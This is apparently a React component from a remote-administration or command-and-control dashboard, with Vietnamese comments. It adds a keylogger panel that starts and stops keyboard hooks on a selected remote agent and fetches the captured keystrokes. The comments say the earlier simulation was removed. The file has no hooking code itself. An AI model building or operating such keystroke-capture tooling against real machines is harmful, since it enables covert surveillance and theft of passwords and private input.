import React, { useState, useEffect } from 'react'; // Sửa đổi import
import { Keyboard, Play, Square, RefreshCw } from 'lucide-react'; // Thêm RefreshCw

// 1. Import hook và service
import { useSocket } from '../contexts/SocketContext';
import { sendCommand } from '../services/socketService';

// 2. Xóa bỏ interface KeylogEntry

export default function KeyloggerCard() {
    const [isLogging, setIsLogging] = useState(false);
    const [logs, setLogs] = useState<string>(""); // 3. Đổi logs thành string
    const [isLoading, setIsLoading] = useState(false); // Thêm state loading
    const { selectedAgentId } = useSocket(); // 4. Lấy agentId từ context

    // 5. XÓA BỎ: logsContainerRef, intervalRef, mockKeys, keyIndex
    
    // 6. XÓA BỎ: useEffect cũ (phần simulation)

    // 7. VIẾT LẠI: handleStartLogging
    const handleStartLogging = async () => {
        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
        setIsLoading(true);
        try {
            // Gửi lệnh "HOOK"
            await sendCommand(selectedAgentId, 'keylog_start_hook');
            setIsLogging(true);
            setLogs("Đã bắt đầu theo dõi. Bấm 'Làm mới Logs' để xem kết quả.\n");
        } catch (err: any) {
            alert(`Lỗi khi bắt đầu: ${err.message}`);
        }
        setIsLoading(false);
    };

    // 8. VIẾT LẠI: handleStopLogging
    const handleStopLogging = async () => {
        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
        setIsLoading(true);
        try {
            // Gửi lệnh "UNHOOK"
            await sendCommand(selectedAgentId, 'keylog_stop_unhook');
            setIsLogging(false);
            setLogs("Đã dừng theo dõi.");
        } catch (err: any) {
            alert(`Lỗi khi dừng: ${err.message}`);
        }
        setIsLoading(false);
    };

    // 9. THÊM MỚI: handlePrintLogs (Lấy kết quả)
    const handlePrintLogs = async () => {
        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
        setIsLoading(true);
        try {
            // Gửi lệnh "PRINT"
            const response = await sendCommand(selectedAgentId, 'keylog_print_logs');
            // Agent sẽ trả về payload là một chuỗi (toàn bộ log đã ghi)
            setLogs(response.payload || "(Không có dữ liệu log)");
        } catch (err: any) {
            setLogs(""); // Xóa log cũ nếu có lỗi
            alert(`Lỗi khi lấy logs: ${err.message}`);
        }
        setIsLoading(false);
    };

    // 10. THÊM MỚI: Tự động xóa log khi đổi Agent
    useEffect(() => {
        setLogs("");
        setIsLogging(false);
    }, [selectedAgentId]);


    return (
        <div className="bg-white rounded-lg shadow-md p-6">
            <h3 className="text-lg font-bold text-gray-800 mb-4 flex items-center gap-2">
                <Keyboard className="w-5 h-5" />
                Keylogger {/* 11. Xóa chữ (Simulation) */}
            </h3>

            <div className="flex gap-2 mb-4">
                {/* (Nút Start) */}
                <button
                    onClick={handleStartLogging}
                    disabled={isLogging || isLoading || !selectedAgentId} // Cập nhật disable
                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
                >
                    <Play className="w-4 h-4" />
                    Start Logging
                </button>
                {/* (Nút Stop) */}
                <button
                    onClick={handleStopLogging}
                    disabled={!isLogging || isLoading || !selectedAgentId} // Cập nhật disable
                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
                >
                    <Square className="w-4 h-4" />
                    Stop Logging
                </button>
            </div>

            {/* 12. THÊM NÚT LÀM MỚI */}
            <div className="flex gap-2 mb-4">
                 <button
                    onClick={handlePrintLogs}
                    disabled={isLoading || !selectedAgentId} // Không cần isLogging
                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
                >
                    <RefreshCw className={`w-4 h-4 ${isLoading ? 'animate-spin' : ''}`} />
                    Làm mới Logs (Print)
                </button>
            </div>

            {/* Màn hình terminal */}
            <div
                // 13. Xóa 'ref'
                className="bg-gray-900 rounded-lg p-4 h-[300px] overflow-y-auto font-mono text-sm"
            >
                {/* 14. THAY ĐỔI CÁCH HIỂN THỊ LOG */}
                {logs.length === 0 ? (
                    <p className="text-gray-500">
                        {!selectedAgentId ? "Vui lòng chọn một Agent." : "Bấm 'Start Logging' để bắt đầu..."}
                    </p>
                ) : (
                    // Dùng <pre> để giữ lại các dấu xuống dòng (\n)
                    <pre className="text-green-400 whitespace-pre-wrap">
                        {logs}
                    </pre>
                )}
            </div>

            {isLogging && (
                <div className="mt-2 text-sm text-green-600 flex items-center gap-2">
                    <span className="w-2 h-2 bg-green-600 rounded-full animate-pulse"></span>
                    Logging active on Agent {/* 15. Xóa (Simulation) */}
                </div>
            )}
        </div>
    );
}